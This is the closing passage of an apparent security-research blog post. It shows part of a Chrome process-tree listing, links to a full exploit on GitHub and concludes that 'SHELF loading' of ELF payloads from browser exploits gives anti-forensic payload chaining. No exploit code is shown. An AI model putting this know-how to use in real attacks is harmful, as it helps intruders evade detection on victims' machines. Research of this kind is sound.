</span></span><span class="line"><span class="cl">    │   │   │   ├─{chrome},104961
</span></span><span class="line"><span class="cl">    │   │   │   ├─{chrome},104964
</span></span><span class="line"><span class="cl">    │   │   │   ├─{chrome},104968
</span></span><span class="line"><span class="cl">    │   │   │   ├─{chrome},104970
</span></span><span class="line"><span class="cl">    │   │   │   ├─{chrome},104971
</span></span><span class="line"><span class="cl">    │   │   │   ├─{chrome},104972
</span></span><span class="line"><span class="cl">    │   │   │   ├─{chrome},104973
</span></span><span class="line"><span class="cl">    │   │   │   └─{chrome},105004
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can observe, there are no anomalies in process-tree hierarchy.
This is a simple visual example, but I hope it will give the reader a glance of what kind of capability we can achieve with SHELF loading. The full exploit can be found <a href="https://github.com/ulexec/ChromeSHELFLoader">here</a></p>
<br />
<hr>
<h2 id="conclusion">Conclusion</h2>
<p>Although reflectively loading ELF images from the browser sounds like a bit of an overkill, in my opinion it is a realistic capability to achieve with SHELF loading in real-life exploit chains, even for chains requiring a SBX exploit. As shown by a Theori blog written by <a href="https://blog.theori.io/research/escaping-chrome-sandbox/">Tim Becker</a>, there are ways to implement platform-agnostic SBX exploits to ultimately disable the Chrome Sandbox for the subsequent use of a second unsandboxed renderer exploit.</p>
<p>Nevertheless, SHELF loading is not a universal technique for every browser exploit, and there may be scenarios in which other techniques to deploy ELF files in memory would be more convenient. However, I still believe that SHELF loading is an interesting avenue for chaining consecutive payloads with anti-forensic capabilities for browser exploits in which arbitrary read/write primitives are granted, which has been a common trait for most V8 exploitable bugs.</p>
<p>I would like to finalize showing my gratitude to the Tmp.0ut comunity, specifically to @elfmaster, @sblip, @TMZ, @netspooky, @richinseattle &amp; @David3141593. Last by not least, I would also like to show my appreciation to the content @btiszka has published in relation to Chrome exploitation, as it has been a great reference and a personal source of motivation.</p>
<p>Thank you for reading, and see you next year!</p>
<p>&ndash; @ulexec</p>

    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">Author</span>
    <span class="item-content">ulexec</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">LastMod</span>
    <span class="item-content">
        2022-02-22
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/pwn/">pwn</a>
          <a href="/tags/chrome/">chrome</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="/post/2022-12-01-xnu_ipc/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">Notes on Mach IPC</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        <a class="next" href="/post/2021-04-09-htb_modern_typer/">
            <span class="next-text nav-default">HTB 2021: Modern Typer </span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="ulexecve@protonmail.com" class="iconfont icon-email" title="email"></a>
      <a href="https://twitter.com/ulexec" class="iconfont icon-twitter" title="twitter"></a>
      <a href="https://linkedin.com/in/ignacio-sanmillan-1aa244b8" class="iconfont icon-linkedin" title="linkedin"></a>
      <a href="https://github.com/ulexec" class="iconfont icon-github" title="github"></a>
  <a href="http://ulexec.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2017 - 
    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>ulexec</span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>



<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>








</body>
</html>
